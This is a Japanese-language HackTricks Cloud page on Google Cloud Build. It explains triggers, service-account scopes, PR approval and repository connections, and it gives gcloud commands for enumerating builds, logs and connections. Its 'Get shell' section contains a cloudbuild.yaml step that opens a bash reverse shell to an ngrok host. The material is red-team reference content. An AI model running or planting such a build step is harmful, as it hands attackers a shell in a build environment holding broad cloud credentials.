# GCP - Cloud Build Enum

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **ハッキングトリックを共有するには、** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出してください。

</details>
{% endhint %}

## 基本情報

Google Cloud Buildは、**ソフトウェアのビルド**およびリリースプロセスを自動化するマネージドCI/CDプラットフォームであり、**ソースコードリポジトリ**と統合し、さまざまなプログラミング言語をサポートします。これにより、開発者はコードを自動的にビルド、テスト、デプロイでき、ビルドステップやワークフローをカスタマイズする柔軟性を提供します。

各Cloud Build Triggerは、**Cloud Repositoryに関連しているか、外部リポジトリ**（Github、Bitbucket、Gitlab）に直接接続されています。

{% hint style="success" %}
リポジトリがダウンロードされるときに[https://source.cloud.google.com/](https://source.cloud.google.com/) URLを介してアクセスされ、クライアントがGithubにアクセスしないため、ここからまたはCloud RepositoriesからGithub/Bitbucketトークンを盗む方法は見つかりませんでした。
{% endhint %}

### イベント

Cloud Buildは以下の場合にトリガーされます：

* **ブランチへのプッシュ**: ブランチを指定
* **新しいタグのプッシュ**: タグを指定
* **プルリクエスト**: PRを受け取るブランチを指定
* **手動呼び出し**
* **Pub/Subメッセージ**: トピックを指定
* **Webhookイベント**: HTTPS URLを公開し、リクエストはシークレットで認証される必要があります

### 実行

3つのオプションがあります：

* 実行するコマンドを指定するyaml/json。通常は：`/cloudbuild.yaml`
* WebコンソールおよびCLIで「インライン」で指定できる唯一のもの
* 最も一般的なオプション
* 認証されていないアクセスに関連
* ビルドする**Dockerfile**
* ビルドする**Buildpack**

### SA権限

**Service Accountは`cloud-platform`スコープを持っている**ため、**すべての特権を使用できます。** **SAが指定されていない場合**（例えばsubmitを行うとき）、**デフォルトのSA** `<proj-number>@cloudbuild.gserviceaccount.com`が**使用されます。**

デフォルトでは権限は与えられていませんが、簡単に権限を付与できます：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 承認

Cloud Buildを設定して**ビルド実行に承認を要求する**ことができます（デフォルトでは無効）。

### PR承認

トリガーがPRの場合、**誰でも公開リポジトリにPRを行うことができるため**、**任意のPRでトリガーの実行を許可するのは非常に危険です**。したがって、デフォルトでは、実行は**所有者およびコラボレーターに対してのみ自動的に行われ**、他のユーザーのPRでトリガーを実行するには、所有者またはコラボレーターが`/gcbrun`とコメントする必要があります。

<figure><img src="../../../.gitbook/assets/image (150).png" alt="" width="563"><figcaption></figcaption></figure>

### 接続とリポジトリ

接続は以下を介して作成できます：

* **GitHub:** **Githubトークンを取得するための権限を求めるOAuthプロンプト**が表示され、**Secret Manager**内に保存されます。
* **GitHub Enterprise:** **GithubApp**のインストールを求められます。GitHub Enterpriseホストからの**認証トークン**が作成され、このプロジェクトの**Secret Manager**のシークレットとして保存されます。
* **GitLab / Enterprise:** **APIアクセス トークンとRead APIアクセス トークンを提供する必要があり**、これらは**Secret Manager**に保存されます。

接続が生成されると、**Githubアカウントがアクセスできるリポジトリをリンク**するために使用できます。

このオプションはボタンを通じて利用可能です：

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
この方法で接続されたリポジトリは、**2nd generationを使用するトリガーでのみ利用可能です。**
{% endhint %}

### リポジトリの接続

これは**`connection`**とは異なります。これは**GithubまたはBitbucketリポジトリへのアクセスを取得するための**さまざまな方法を提供しますが、**接続オブジェクトを生成するのではなく、リポジトリオブジェクト（1st generation）を生成します。**

このオプションはボタンを通じて利用可能です：

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ストレージ

Cloud Buildは、**トリガーのファイルを保存するために新しいストレージを生成することがあります**。これは、GCPが提供する例で発生します：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
[security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) という名前のStorageバケットが、使用するファイルを含む `.tgz` を保存するために作成されます。

### Get shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
```markdown
Install gcloud inside cloud build:
```

クラウドビルド内にgcloudをインストールする:
```bash
# https://stackoverflow.com/questions/28372328/how-to-install-the-google-cloud-sdk-in-a-docker-image
curl https://dl.google.com/dl/cloudsdk/release/google-cloud-sdk.tar.gz > /tmp/google-cloud-sdk.tar.gz
mkdir -p /usr/local/gcloud
tar -C /usr/local/gcloud -xvf /tmp/google-cloud-sdk.tar.gz
/usr/local/gcloud/google-cloud-sdk/install.sh
```
### Enumeration

ビルド構成とログに**機密情報が含まれている**可能性があります。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 特権昇格

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 認証されていないアクセス

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### ポストエクスプロイト

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

{% hint style="success" %}
AWS Hackingを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **PRを提出してハッキングトリックを共有する** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリ。

</details>
{% endhint %}
